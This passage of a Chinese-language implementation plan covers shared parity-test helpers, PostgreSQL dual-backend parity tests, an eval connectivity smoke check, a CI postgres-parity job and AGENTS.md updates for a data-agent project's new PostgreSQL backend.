        "filters": [],
        "limit": 2000,
    }
    if fill_gaps:
        dsl["fill_gaps"] = True
    return dsl


__all__ = ["abs_window_dsl", "assert_rows_equal", "compile_dsl", "norm_cell"]
```

- [ ] **Step 2: test_dual_backend_parity.py 改为 import（断言逻辑零变化）**

删除 `_norm_cell` / `_assert_rows_equal` / `_compile_dsl` / `_abs_window_dsl` 四个函数定义（第 26-65、88-101、140-163 行），在文件 import 区（`import pytest` 之后）加：

```python
# 共享工具自 parity_utils 导入（二十二期提取）：别名保留下划线前缀，
# 本文件其余断言逻辑逐字不变
from parity_utils import abs_window_dsl as _abs_window_dsl
from parity_utils import assert_rows_equal as _assert_rows_equal
from parity_utils import compile_dsl as _compile_dsl
from parity_utils import norm_cell as _norm_cell
```

其余内容（模块 docstring、`pytestmark`、`_test_dsn`、fixture、`_run_dsl`、5 个测试函数）**逐字保留**。

- [ ] **Step 3: 回归验证（跳过态收集 + 全量）**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/test_dual_backend_parity.py -q`
Expected: `1 skipped`（MYSQL_TEST_HOST 未配置；收集与 import 无错即重构无损）。

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/ -q -x --ignore=tests/test_dual_backend_parity.py`
Expected: 全绿（提取不影响任何 duckdb 路径）。

- [ ] **Step 4: Lint 与提交**

```bash
black --check . && ruff check .
git add tests/parity_utils.py tests/test_dual_backend_parity.py
git commit -m "refactor: 双后端一致性测试共享工具提取至 tests/parity_utils（行为不变）"
```

---

### Task 8: PG parity 测试（CI 生效）

**Files:**
- Test: `tests/test_pg_backend_parity.py`（新建）

**Interfaces:**
- Consumes: `tests/parity_utils.py`（Task 7）；`PostgresAdapter`（Task 3）；`compile_dsl`（Task 2 后支持 postgres 方言）。
- Produces: 5 个 parity 用例（本地 skip、CI postgres-parity job 执行）。

- [ ] **Step 1: 新建 tests/test_pg_backend_parity.py**

```python
"""PostgreSQL 双后端一致性测试（二十二期 spec D14）：同一 DSL 两后端编译+执行，结果必须一致。

运行条件：设置 POSTGRES_TEST_HOST/PORT/USER/PASSWORD/DATABASE 指向已执行
``python -m mock.init_postgres`` 的测试库；未设置 POSTGRES_TEST_HOST 时整文件
跳过（本地开发不跑 PG，parity 由 CI postgres-parity job 承担——spec §9 R1）。

比对口径与 test_dual_backend_parity.py 同源（tests/parity_utils.py，勿改）。
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from parity_utils import abs_window_dsl as _abs_window_dsl
from parity_utils import assert_rows_equal as _assert_rows_equal
from parity_utils import compile_dsl as _compile_dsl

pytestmark = pytest.mark.skipif(
    not os.getenv("POSTGRES_TEST_HOST"),
    reason="需要 PostgreSQL 测试库（POSTGRES_TEST_* 环境变量）",
)


def _test_dsn() -> dict:
    """测试库连接参数（POSTGRES_TEST_* 环境变量；独立于运行时 POSTGRES_* 配置）。"""
    return {
        "host": os.environ["POSTGRES_TEST_HOST"],
        "port": int(os.getenv("POSTGRES_TEST_PORT", "5432")),
        "user": os.getenv("POSTGRES_TEST_USER", "postgres"),
        "password": os.getenv("POSTGRES_TEST_PASSWORD", ""),
        "database": os.getenv("POSTGRES_TEST_DATABASE", "gmall"),
    }


@pytest.fixture(scope="module")
def pg_conn():
    from exec.engine.postgres_adapter import PostgresAdapter

    conn = PostgresAdapter(_test_dsn()).connect_readonly()
    yield conn
    conn.close()


def _run_dsl(dsl, duck_conn, pg_conn):
    """同一 DSL 双后端编译执行（走 execute_sql 全护栏链路）。"""
    from exec.engine import get_adapter
    from exec.engine.postgres_adapter import PostgresAdapter
    from exec.guards import execute_sql

    return {
        "duckdb": execute_sql(
            duck_conn,
            _compile_dsl(dsl, "duckdb"),
            adapter=get_adapter("duckdb"),
            max_result_rows=20000,
        ),
        "postgres": execute_sql(
            pg_conn,
            _compile_dsl(dsl, "postgres"),
            adapter=PostgresAdapter(_test_dsn()),
            max_result_rows=20000,
        ),
    }


def test_golden_dsls_parity(conn, pg_conn):
    """golden_dataset 全量 DSL 双后端一致（spec D14 主断言）。"""
    golden = json.loads(
        (Path(__file__).parents[1] / "eval" / "golden_dataset.json").read_text(encoding="utf-8")
    )
    # 单轮条目带顶层 dsl；多轮条目（M 系列）为 turns[] 嵌套——两层都覆盖
    dsls = [item["dsl"] for item in golden if "dsl" in item] + [
        turn["dsl"] for item in golden for turn in item.get("turns", []) if "dsl" in turn
    ]
    assert dsls, "golden_dataset 未解析出任何 DSL"
    for dsl in dsls:
        results = _run_dsl(dsl, conn, pg_conn)
        _assert_rows_equal(results["duckdb"].rows, results["postgres"].rows)


def test_week_boundary_parity(conn, pg_conn):
    """跨周边界分桶一致（周日 2021-01-03 / 周一 2021-01-04）。

    DuckDB 与 PG 的 date_trunc('week') 均为周一锚定——本用例窗口横跨两周边界，
    口径漂移即行集合不一致。
    """
    results = _run_dsl(_abs_window_dsl("week", "2021-01-01", "2021-01-15"), conn, pg_conn)
    rows = results["duckdb"].rows
    assert rows, "DuckDB 侧应产出两周分桶"
    _assert_rows_equal(rows, results["postgres"].rows)


def test_fill_gaps_five_years_parity(conn, pg_conn):
    """day 粒度 5 年窗口（1826 行）。

    PG generate_series 原生集合函数无递归深度限制（MySQL 需
    cte_max_recursion_depth 承载——PG 侧该负担不存在，spec D8）。
    """
    results = _run_dsl(
        _abs_window_dsl("day", "2021-01-01", "2026-01-01", fill_gaps=True), conn, pg_conn
    )
    assert len(results["postgres"].rows) == 1826
    assert len(results["duckdb"].rows) == 1826
    _assert_rows_equal(results["duckdb"].rows, results["postgres"].rows)


def test_comparison_time_dim_parity(conn, pg_conn):
    """comparison 按位配对（PG 加法平移 + INTERVAL '1 year' 语义）双后端一致。"""
    dsl = _abs_window_dsl("day", "2025-06-01", "2025-07-01")
    dsl["time_filter"]["comparison"] = "yoy"
    results = _run_dsl(dsl, conn, pg_conn)
    _assert_rows_equal(results["duckdb"].rows, results["postgres"].rows)


def test_pool_reuse_session_still_readonly():
    """连接池归还复用后会话加固不失效。

    PG 断言口径：current_setting('transaction_read_only') == 'on'
    （MySQL 版断言 @@transaction_read_only == 1）。
    """
    from exec.engine.postgres_adapter import PostgresAdapter
    from exec.pool import ReadOnlyConnectionPool

    adapter = PostgresAdapter(_test_dsn())
    pool = ReadOnlyConnectionPool(adapter, max_connections=1)
    conn = pool.acquire()
    conn2 = None
    try:
        pool.release(conn)
        conn2 = pool.acquire()  # 复用同一连接
        with conn2.cursor() as cur:
            cur.execute("SELECT current_setting('transaction_read_only')")
            assert cur.fetchone()[0] == "on"
    finally:
        if conn2 is not None:
            pool.release(conn2)
        pool.close()
```

- [ ] **Step 2: 跳过态验证**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/test_pg_backend_parity.py -q`
Expected: `1 skipped`（POSTGRES_TEST_HOST 未配置；收集与 import 无错）。

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/ -q -k "parity"`
Expected: mysql 与 pg 两个 parity 文件各 skipped，无收集错误。

- [ ] **Step 3: Lint 与提交**

```bash
black --check . && ruff check .
git add tests/test_pg_backend_parity.py
git commit -m "test: PostgreSQL 双后端一致性回归（golden 全量 + 周边界/5 年补零/comparison/池复用，二十二期 D14）"
```

---

### Task 9: eval --backend postgres 冒烟

**Files:**
- Modify: `eval/eval_runner.py:387-415`（新增 `_postgres_smoke`）
- Modify: `eval/eval_runner.py:433-442`（`--backend` choices 与 main 分发）

**Interfaces:**
- Consumes: `PostgresAdapter`（Task 3）、`execute_sql` 全护栏链路（既有）。
- Produces: `python -m eval.eval_runner --backend postgres` 连通性冒烟。

- [ ] **Step 1: eval_runner.py 增加 _postgres_smoke**

在 `_mysql_smoke` 函数之后新增：

```python
def _postgres_smoke() -> int:
    """PostgreSQL 后端连通性冒烟（二十二期 spec D16）：加固连接 + 白名单 + 三护栏。

    golden 评测的期望 SQL 与快照锚定 DuckDB 方言，PostgreSQL 后端不做全量
    比对（诚实跳过而非硬跑方言错配的 golden）；PG 正确性回归由
    tests/test_pg_backend_parity.py（双后端一致性）承担。
    """
    from exec.engine.postgres_adapter import PostgresAdapter
    from exec.guards import execute_sql

    adapter = PostgresAdapter()
    conn = adapter.connect_readonly()
    try:
        result = execute_sql(
            conn,
            "SELECT COUNT(*) AS n FROM order_detail",
            statement_timeout_ms=settings.QUERY_TIMEOUT_MS,
            max_result_rows=1,
            adapter=adapter,
        )
    finally:
        conn.close()
    print(
        f"[eval][postgres-smoke] order_detail 行数 = {result.rows[0][0]}"
        "（连接/加固/白名单/护栏链路通）"
    )
    print(
        "[eval][postgres-smoke] golden 锚定 DuckDB 方言，PG 正确性回归见 tests/test_pg_backend_parity.py"
    )
    return 0
```

- [ ] **Step 2: CLI choices 与分发**

`--backend` 参数（第 433-438 行）改为：

```python
    parser.add_argument(
        "--backend",
        choices=["duckdb", "mysql", "postgres"],
        default="duckdb",
        help="查询执行后端：duckdb（默认）；mysql/postgres 仅做连通性冒烟（golden 锚定 DuckDB 方言）",
    )
```

`main()` 分发（第 441-442 行）改为：

```python
    if args.backend == "mysql":
        return _mysql_smoke()
    if args.backend == "postgres":
        return _postgres_smoke()
```

- [ ] **Step 3: 验证（duckdb 主路径回归 + 冒烟路径 fail-fast）**

Run: `conda run -n dataagent --no-capture-output python -m eval.eval_runner --skip-snapshot -q 2>&1 | tail -3`
Expected: oracle 契约回归全绿（duckdb 默认路径不受影响）。

Run: `conda run -n dataagent --no-capture-output python -m eval.eval_runner --backend postgres 2>&1 | tail -2`
Expected: 连接失败类报错（本地无 PG 实例）——证明分发路径已接线且 fail-fast 诚实报错，不静默。

- [ ] **Step 4: Lint 与提交**

```bash
black --check . && ruff check .
git add eval/eval_runner.py
git commit -m "feat: eval --backend postgres 连通性冒烟（二十二期 D16）"
```

---

### Task 10: CI 门禁 job + AGENTS.md 同步 + 全量收尾

**Files:**
- Modify: `.github/workflows/ci.yml:88`（nightly job 之前插入 postgres-parity job）
- Modify: `AGENTS.md`（常用命令、目录结构注释、关键约定）
- Test: 全量回归

**Interfaces:**
- Consumes: Task 6 的 `mock/init_postgres`、Task 8 的 `tests/test_pg_backend_parity.py`。
- Produces: CI `postgres-parity` 门禁（PG 链路首次真实执行面）。

- [ ] **Step 1: ci.yml 新增 postgres-parity job**

在 `mysql-parity` job 之后、`nightly` job 之前插入：

```yaml
  # PostgreSQL 服务级门禁（二十二期）：与 mysql-parity 同构——golden 全量 DSL
  # 双后端一致性 + 周边界/5 年补零/comparison 配对/池复用加固。本地开发不跑 PG
  # （POSTGRES_TEST_* 未配置自动跳过），CI 是 PG 链路首个真实执行面（spec §9 R1）。
  postgres-parity:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: root
          POSTGRES_USER: postgres
          POSTGRES_DB: gmall
        ports:
          - 5432:5432
        options: >-
          --health-cmd="pg_isready -U postgres"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=12
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install dev dependencies
        run: pip install -r requirements-dev.txt
      - name: Build PostgreSQL warehouse (DDL transpiled + same-source data)
        run: python -m mock.init_postgres
        env:
          POSTGRES_HOST: 127.0.0.1
          POSTGRES_PORT: "5432"
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: root
          POSTGRES_DATABASE: gmall
      - name: Dual-backend parity tests (golden DSLs + Review Focus)
        run: python -m pytest tests/test_pg_backend_parity.py -q
        env:
          POSTGRES_TEST_HOST: 127.0.0.1
          POSTGRES_TEST_PORT: "5432"
          POSTGRES_TEST_USER: postgres
          POSTGRES_TEST_PASSWORD: root
          POSTGRES_TEST_DATABASE: gmall
```

- [ ] **Step 2: AGENTS.md 同步**

三处修改（保持既有措辞风格）：

1. 常用命令代码块中 `python -m mock.init_mysql` 块之后插入：

````markdown
# 重建 PostgreSQL 版数仓（二十二期可选后端：DDL 运行时转译 + 同源数据；
# 需 .env 配置 POSTGRES_* 与可写账号，库需预先存在）
python -m mock.init_postgres

# 双后端一致性回归（需 POSTGRES_TEST_* 指向已 init_postgres 的测试库，未配置自动跳过）
python -m pytest tests/test_pg_backend_parity.py -q
````

2. 目录结构注释中 `二十一期 engine/ 执行引擎抽象层：EngineAdapter 协议 + duckdb/mysql 双 adapter` 改为 `二十一期 engine/ 执行引擎抽象层：EngineAdapter 协议 + duckdb/mysql/postgres 三 adapter（二十二期增 postgres）`；`compiler/ DSL -> SQL 确定性编译器` 行不变，`compiler/dialect/` 相关注释如出现双值列举同步为三值。

3. "MySQL 执行后端（二十一期，2026-10）"条目之后新增条目：

```markdown
- PostgreSQL 执行后端（二十二期，2026-10）：`DB_BACKEND` 三值
  （duckdb|mysql|postgres，默认 duckdb 零破坏）；驱动 psycopg3；
  超时 = statement_timeout（SQLSTATE 57014 归一）；扫描熔断 = EXPLAIN ANALYZE
  actual 段 rows；只读三防线 = 只读账号 + default_transaction_read_only +
  方言增量黑名单（COPY/DO/LISTEN/NOTIFY + pg_* 函数族）；探索层 sec_* 安全面
  走 TEMP 视图（与 DuckDB 同路）；date_trunc/generate_series 全原生（spine
  无递归深度问题）；转义仅单引号翻倍（standard_conforming_strings=on 由
  harden 显式 pin，反斜杠不翻倍）；comparison 对齐走 renderer.date_add
  （PG 加法等价式，spec D17）；CI postgres-parity 门禁锚定 postgres:16，
  兼容基线 >= 13；golden 评测锚定 DuckDB 方言不随引擎切换。
```

- [ ] **Step 3: 全量回归门禁**

Run: `conda run -n dataagent --no-capture-output python -m pytest -q`
Expected: 全绿（PG parity 与 mysql parity 各自 skipped）。

Run: `black --check . && ruff check .`
Expected: 全绿。

- [ ] **Step 4: 提交**

```bash
git add .github/workflows/ci.yml AGENTS.md
git commit -m "feat: CI postgres-parity 门禁（postgres:16 服务容器）+ AGENTS.md 同步（二十二期）"
```

- [ ] **Step 5: 推送分支并确认 CI**

```bash
git push -u origin feat/postgres-backend
```

推送后观察 CI 三个 job（test / mysql-parity / postgres-parity）：**postgres-parity 首绿即 PG 链路首次真实验证通过**（spec §10）。若该 job 失败：R1 缓解措施生效——init 步骤失败携带原始 DDL、parity 失败输出行数对照与 diff 明细，按失败信息修复后重推（不改 spec 与计划即无需新增任务，属本任务收尾循环）。

---

## 红线自查记录（计划完成后执行，执行者勿重复）

- 规格覆盖：spec §1 目标 1-6 → Task 1（配置）/2（方言）/3（引擎）/4（护栏）/5（探索层）/6（建仓）/7-8（parity）/9（冒烟）/10（CI）；§4 D1-D17 逐条落到对应任务（D17→Task 2，其余见各任务标注）；§5 安全对照→Task 3/4/5；§6 配置→Task 1；§7 确定性→Task 6/7/8；§8 版本→Task 10 CI 锚定；§10 成功标准→Task 10 收尾。无缺口。
- 类型一致性：`install_secure_views(conn, principal)`（Task 3 定义 / Task 5 调用）、`pg_interval_literal(step)`（Task 2 内部）、`HARDEN_STATEMENTS/parse_pg_scan_rows/PG_QUERY_CANCELED_SQLSTATE`（Task 3 定义 / 测试消费）、parity_utils 四函数（Task 7 定义 / Task 8 消费）核对一致。
- Review Focus 落实：#1→Task 3 `test_engine_error_timeout_57014`；#2→Task 3 `test_parse_pg_scan_rows_not_measurable_without_actual`；#3→Task 3 `test_harden_statements_cover_security_baseline` + Task 2 转义用例；#4→Task 2 `test_spine_rejects_unknown_interval_form`；#5→Task 3 灌数三用例。
